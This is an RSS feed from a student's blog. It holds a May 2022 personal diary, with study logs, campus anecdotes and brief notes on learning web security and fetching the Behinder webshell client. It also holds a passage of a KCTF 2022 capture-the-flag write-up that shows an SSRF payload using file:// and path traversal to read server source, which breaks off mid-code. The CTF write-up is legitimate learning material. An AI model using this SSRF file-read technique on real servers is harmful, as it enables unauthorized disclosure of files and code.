<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>茄子的养殖场</title>
        <link>https://proben1.github.io/</link>
        <description>Recent content on 茄子的养殖场</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sat, 04 Jun 2022 12:52:34 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>茄科生物观测日志2022.5</title>
        <link>https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.5/</link>
        <pubDate>Sat, 04 Jun 2022 12:52:34 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.5/</guid>
        <description>&lt;p&gt;2022.5&lt;/p&gt;
&lt;p&gt;6.1&lt;/p&gt;
&lt;p&gt;凌晨，0：42，读完《我们生活在南京》。&lt;/p&gt;
&lt;p&gt;天瑞老师的书，中国式的爱，信息的浪漫，20年的距离，以及，南京。&lt;/p&gt;
&lt;p&gt;以后，记得在月牙湖埋一个时间胶囊，就当是为了半夏。&lt;/p&gt;
&lt;p&gt;也就明白了我如同码头薯条一般的意义：&lt;/p&gt;
&lt;p&gt;1、找个心爱的女孩子&lt;/p&gt;
&lt;p&gt;2、维持和她在南京的生活&lt;/p&gt;
&lt;p&gt;自高考之后，从未如此清晰。至于她是谁，她怎样，用什么维持生活，什么样的生活，都是后话了。&lt;/p&gt;
&lt;p&gt;5.31&lt;/p&gt;
&lt;p&gt;22℃的西安，早上醒来，无汗，可以感受到身体的舒适和心情的愉悦。&lt;/p&gt;
&lt;p&gt;身体康复了。&lt;/p&gt;
&lt;p&gt;晚上和安全组的大家絮叨絮叨。&lt;/p&gt;
&lt;p&gt;调整了下单词的计划，打算先刷完核心词汇，比较简单，出现频率也更高。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：607&lt;/p&gt;
&lt;p&gt;复习：243&lt;/p&gt;
&lt;p&gt;5.30&lt;/p&gt;
&lt;p&gt;开摆上了一天课。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：130&lt;/p&gt;
&lt;p&gt;复习：190&lt;/p&gt;
&lt;p&gt;5.29&lt;/p&gt;
&lt;p&gt;鏖战一天，2022年全国大学生信息安全竞赛，MuReg7gW西邮第三，没有进入线下赛，其中队员dk带病且不带环境作战（乐）。&lt;/p&gt;
&lt;p&gt;正在谋划ctf的退役，重心也好久没放在这上了。&lt;/p&gt;
&lt;p&gt;打算给zc写封信，恩，顺便还可以给贾贾写点啥。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：30&lt;/p&gt;
&lt;p&gt;复习：199&lt;/p&gt;
&lt;p&gt;5.28&lt;/p&gt;
&lt;p&gt;在荒野的黑夜，面对未知，牵紧她的手。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：81&lt;/p&gt;
&lt;p&gt;复习：162&lt;/p&gt;
&lt;p&gt;5.27&lt;/p&gt;
&lt;p&gt;梦见晓旭老师了，很开心&lt;/p&gt;
&lt;p&gt;重装系统，还有驱动，等待的时候在跟着学校师傅偷师hhh。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：78&lt;/p&gt;
&lt;p&gt;复习：302&lt;/p&gt;
&lt;p&gt;5.26&lt;/p&gt;
&lt;p&gt;沙地沟的乔树林&lt;/p&gt;
&lt;p&gt;体测，引体向上12个！做完肚子肌肉疼hhh&lt;/p&gt;
&lt;p&gt;出发，调查联通卡一年700块钱的真相。&lt;/p&gt;
&lt;p&gt;调查地点：通院111&lt;/p&gt;
&lt;p&gt;调查结果：&lt;/p&gt;
&lt;p&gt;气死我了，前两天有个联通的客服给我打电话，说这边有一个加油包，让我确认收到短信就可以。&lt;/p&gt;
&lt;p&gt;结果她给我弄了一个月租100，50G的流量包，然后捆绑12个月，违约金还每个月8块。&lt;/p&gt;
&lt;p&gt;半句没提办理，元，人民币，费用，年限这些，开头就是为了回馈老用户。&lt;/p&gt;
&lt;p&gt;刚刚找了学校联通的站点，那有个巨强的阿姨，甚至和我导员一个名字，了解情况后直接开打，用强烈的态度和动不动就要投诉的语气，帮我给退了。感谢&lt;/p&gt;
&lt;p&gt;打算重装电脑系统了，难受，现在是两件事，第1个是C盘要备份哪些东西，第2个是预想一下我的以后的电脑的内容安排。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：149&lt;/p&gt;
&lt;p&gt;复习：144&lt;/p&gt;
&lt;p&gt;5.25&lt;/p&gt;
&lt;p&gt;西安雨天，闷热，无风。&lt;/p&gt;
&lt;p&gt;电脑坏了，修一晚上没好，难受。&lt;/p&gt;
&lt;p&gt;windows11，开机之后反复白屏，资源管理器一直崩溃。可以关闭，关闭后就一直白屏。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：0&lt;/p&gt;
&lt;p&gt;复习：160&lt;/p&gt;
&lt;p&gt;5.24&lt;/p&gt;
&lt;p&gt;裂，早八的课，全宿舍九点半醒的，最重要的是还是管理学，啊啊啊。下节课有必要找老师谈谈了。&lt;/p&gt;
&lt;p&gt;管理学补偿计划：&lt;/p&gt;
&lt;p&gt;预先准备小礼品。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：120&lt;/p&gt;
&lt;p&gt;复习：184&lt;/p&gt;
&lt;p&gt;5.23&lt;/p&gt;
&lt;p&gt;当你想买一杯奶茶但是发现你已经连续买了三天的奶茶的时候。。。&lt;/p&gt;
&lt;p&gt;想了我在大学里学的第一个单词：&lt;/p&gt;
&lt;p&gt;pursue&lt;/p&gt;
&lt;p&gt;给电脑清灰换硅脂，40，好便宜。&lt;/p&gt;
&lt;p&gt;然后做客旁边的海文考研唠嗑，四个人唠了一中午。&lt;/p&gt;
&lt;p&gt;找老师咨询科研项目的事，选了路由交换算法相关的理论领域，老师说先读些论文。不错，看来我得补补计网这块的内容还有图论。&lt;/p&gt;
&lt;p&gt;晚上终于把jsonp劫持看懂了，同源策略就差写.md嘞。&lt;/p&gt;
&lt;p&gt;睡前在想一个问题：霜之哀伤到底该对应什么啊？火之高兴？炎之腾跃？&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：156&lt;/p&gt;
&lt;p&gt;复习：155&lt;/p&gt;
&lt;p&gt;5.22&lt;/p&gt;
&lt;p&gt;联系老师：&lt;/p&gt;
&lt;p&gt;成功客服社恐！&lt;/p&gt;
&lt;p&gt;食堂可乐事件：&lt;/p&gt;
&lt;p&gt;食堂点了份快餐，去楼下买杯豆浆回来后发现我的饭旁边多了瓶未开封的可乐。&lt;/p&gt;
&lt;p&gt;是哪个吧友让我帮着保管它吗，还是有人暗地送我可乐，亦或是有人认错饭啦？&lt;/p&gt;
&lt;p&gt;我只知道，最后直到我吃完饭，也没有人认领这瓶3.5的可口可乐。我计划去操场走几圈，如果回来的时候可乐还在的话，我就把它拿走卖给舍友。&lt;/p&gt;
&lt;p&gt;结果：走完圈往回宿舍了。&lt;/p&gt;
&lt;p&gt;蜜雪冰城加糖事件：&lt;/p&gt;
&lt;p&gt;两个妹子与蜜雪店员。&lt;/p&gt;
&lt;p&gt;妹子：不要糖。&lt;/p&gt;
&lt;p&gt;店员：不行，最少五五糖。&lt;/p&gt;
&lt;p&gt;妹子：我们不想加糖，可以不要吗？&lt;/p&gt;
&lt;p&gt;店员：不好意思我们这里有规定，糖最少要加到五五。&lt;/p&gt;
&lt;p&gt;妹子：额，你们这里是原料就是甜的还是后加的糖啊？&lt;/p&gt;
&lt;p&gt;店员：我们这里是单独加糖的。&lt;/p&gt;
&lt;p&gt;妹子：那你们就最后不放糖不就行了吗。&lt;/p&gt;
&lt;p&gt;店员（略有思考）：不行的，我们这里是全程监控的，必须按规定的来。&lt;/p&gt;
&lt;p&gt;妹子：。。。。。。&lt;/p&gt;
&lt;p&gt;雪顶咖啡到底该怎么喝：&lt;/p&gt;
&lt;p&gt;记得我第一次喝雪顶咖啡，那是前几天的一个阴云密布但仍然26°C的下午。我一边喝咖啡一边走圈背单词，一管到底，先苦后甜，冰淇淋只是糖和奶而已。&lt;/p&gt;
&lt;p&gt;今天我第二次喝雪顶咖啡，直接勺子开挖，先甜后苦，摩卡与冰淇淋完美融合，可惜最后只剩下咖啡与冰块。&lt;/p&gt;
&lt;p&gt;打算再喝的时候喝到一半，买个两块钱甜筒扣上去。&lt;/p&gt;
&lt;p&gt;脱单盲盒：&lt;/p&gt;
&lt;p&gt;一元留一个，一元取一个。&lt;/p&gt;
&lt;p&gt;新爱好：喝着蜜雪走圈背单词。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：155&lt;/p&gt;
&lt;p&gt;复习：97&lt;/p&gt;
&lt;p&gt;5.21&lt;/p&gt;
&lt;p&gt;爱死机第三季！给爷看！&lt;/p&gt;
&lt;p&gt;又去了一家考研机构咨询，又被放大了一次焦虑，好处是我对考研的印象越来越清晰，坏处是机构给你描述的场景实在是太美妙了，美妙到让你忘记三万块钱的意义。最后的结果就是产生了一种小孩子买不到玩具的心理。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：121&lt;/p&gt;
&lt;p&gt;复习：117&lt;/p&gt;
&lt;p&gt;5.20&lt;/p&gt;
&lt;p&gt;今天是520诶，参加了一个认识另一个我的活动，发现匹配到的是一个大四的学长，考上的西柚的研究生，当时怎么也没想到是这样一个展开。&lt;/p&gt;
&lt;p&gt;上午计划完美执行，10:43到食堂，发现肥牛金针菇没有开门，遂换成5个大包子。&lt;/p&gt;
&lt;p&gt;下午补了寻昼行动，夜半nb。&lt;/p&gt;
&lt;p&gt;晚上和网协的学妹聊天，好快啊。。她们都快独当一面了。每一次成长都来源于对困难的直面。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：147&lt;/p&gt;
&lt;p&gt;复习：91&lt;/p&gt;
&lt;p&gt;5.19&lt;/p&gt;
&lt;p&gt;上午塞罕坝精神&lt;/p&gt;
&lt;p&gt;下午奇趣蛋行动&lt;/p&gt;
&lt;p&gt;晚上被六级折磨&lt;/p&gt;
&lt;p&gt;普普通通的一天&lt;/p&gt;
&lt;p&gt;零号模拟系统启动，开始世界模拟：&lt;/p&gt;
&lt;p&gt;明天正常起，带洗澡用品，数电书，英语卷，穿拖鞋，戴口罩，做核酸，早饭，路上明日方舟，上课，不听讲课上写完数电作业，然后补昨天的阅读，写今天的阅读，下课直奔澡堂（记得洗澡时候放听力磨耳朵hhh开玩笑的），洗完到食堂大概在10：45，去美广买一份肥牛金针菇烤盘饭带走，回宿舍洗衣服，做听力，背单词，晾衣服，上床，再背单词，午觉。&lt;/p&gt;
&lt;p&gt;起床，先把英语任务做完，直奔网协，补同源策略。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：121&lt;/p&gt;
&lt;p&gt;复习：1&lt;/p&gt;
&lt;p&gt;5.18&lt;/p&gt;
&lt;p&gt;发现对面宿舍会根据我们宿舍是否锁门而选择是否逃课，但这里有个bug，因为我们宿舍并不只有电信的学生hhh。&lt;/p&gt;
&lt;p&gt;看同源策略，扯出jsonp和cors，又发现js看不懂，麻。&lt;/p&gt;
&lt;p&gt;英语啊英语，六级还有不到一个月啊，而我现在读个文章都费劲。&lt;/p&gt;
&lt;p&gt;提到这个就不得不想起考研的几科，顿时有种百废待兴的感觉。&lt;/p&gt;
&lt;p&gt;哈哈哈哈睡前宿舍讨论发现电信学的通原是C，没有期中考试。&lt;/p&gt;
&lt;p&gt;今日六级单词：&lt;/p&gt;
&lt;p&gt;学习：1&lt;/p&gt;
&lt;p&gt;复习：0&lt;/p&gt;
&lt;p&gt;5.17&lt;/p&gt;
&lt;p&gt;花了一下午时间，找机构老师聊了聊，简单了解了下考研，收获很大。&lt;/p&gt;
&lt;p&gt;emmmm流水账记着记着就感觉自己在记流水账诶，最近找个时间看看想写点啥长点的。最近好像也没咋做梦，突然想把梦境发出来，实在是很神奇。&lt;/p&gt;
&lt;p&gt;感觉自己个同源策略有仇一样。。。是不是因为太抽象了？&lt;/p&gt;
&lt;p&gt;5.15&lt;/p&gt;
&lt;p&gt;组团去吃湘菜，with2020安全组&amp;amp;党爷，体会到了，辣椒里找肉的感觉。&lt;/p&gt;
&lt;p&gt;5.14&lt;/p&gt;
&lt;p&gt;打出血热的疫苗，没吃早饭，穿的拖鞋，下雨，麻。&lt;/p&gt;
&lt;p&gt;晚上看薇尔莉特的电影版，见到少佐了，圆满。个人感觉，之前给观众展示的一直是薇尔莉特眼中的少佐，其实真实的少佐没有那么完美，从这些年一直在岛上自责与逃避就能体现出来。还有另一种看法，他自己选择了自己的路吧。&lt;/p&gt;
&lt;p&gt;5.13&lt;/p&gt;
&lt;p&gt;今天发现买的牛奶5.3过期，还剩好几袋扔了有点可惜。想起开学那天，舍友当着我的面喝了保质期1月份的牛奶然后啥事没有的壮举，抱着侥幸心理来了一袋。&lt;/p&gt;
&lt;p&gt;一个学生喝了一袋过期牛奶，这是他身体发生的变化。&lt;/p&gt;
&lt;p&gt;J.Y is a 20 years old boy……&lt;/p&gt;
&lt;p&gt;学了手DNSlog注入，安了个Wappalyzer。&lt;/p&gt;
&lt;p&gt;读完这两篇之后感觉看了个电影&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/211842.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/211842.html&lt;/a&gt;		全程带阻：记一次授权网络攻防演练（上）&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/211847.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/211847.html&lt;/a&gt;		全程带阻：记一次授权网络攻防演练（下）&lt;/p&gt;
&lt;p&gt;下了个冰蝎3.0，打不开，一查是因为少个javafx库&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.1024sou.com/article/741211.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.1024sou.com/article/741211.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5.11&lt;/p&gt;
&lt;p&gt;抽空看了《派对》和《辉夜3》&lt;/p&gt;
&lt;p&gt;派对最新一集的rap真的看入神了，一是我第一次看（听）这种形式的，二是孔明的说唱很魔性。&lt;/p&gt;
&lt;p&gt;“请随我们一同，用音乐实现天下太平吧。”&lt;/p&gt;
&lt;p&gt;转头来辉夜那集也是即兴说唱hhh&lt;/p&gt;
</description>
        </item>
        <item>
        <title>KCTF2022春 4 飞蛾扑火</title>
        <link>https://proben1.github.io/2022/kctf2022%E6%98%A5-4-%E9%A3%9E%E8%9B%BE%E6%89%91%E7%81%AB/</link>
        <pubDate>Wed, 18 May 2022 20:05:12 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/kctf2022%E6%98%A5-4-%E9%A3%9E%E8%9B%BE%E6%89%91%E7%81%AB/</guid>
        <description>&lt;p&gt;source:http://121.36.145.157:8044/&lt;/p&gt;
&lt;p&gt;进去之后F12&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;欢迎挑战 Design by 香草&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&amp;lt;!--phpinfo.php--&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;url.php?url=https://ctf.pediy.com/upload/team/762/team236762.png&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示了phpinfo，&lt;code&gt;http://121.36.145.157:8044/phpinfo.php&lt;/code&gt;直接进去了，查到路径： /var/www/html；协议&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Protocols&lt;/th&gt;
&lt;th&gt;dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3, pop3s, rtmp, rtsp, scp, sftp, smb, smbs, smtp, smtps, telnet, tftp&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;通过file协议查看源代码;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://121.36.145.157:8044/url.php?url=file://127.0.0.1/../../../../../../var/www/html/url.php&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;curl_request&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$header&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;content-type: application/json&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$https&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$timeout&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; strtoupper(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_init();&lt;span style=&#34;color:#6272a4&#34;&gt;//初始化
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//访问的URL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//只获取页面内容，但不输出
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$https&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYPEER, &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//https请求 不验证证书
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYHOST, &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//https请求 不验证HOST
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POST, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//请求方式为post请求
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;PUT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; strtoupper(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;DELETE&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_CUSTOMREQUEST, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;//设置请求方式
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POSTFIELDS, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//请求数据
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$timeout&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HTTPHEADER, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$header&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;//模拟的header头
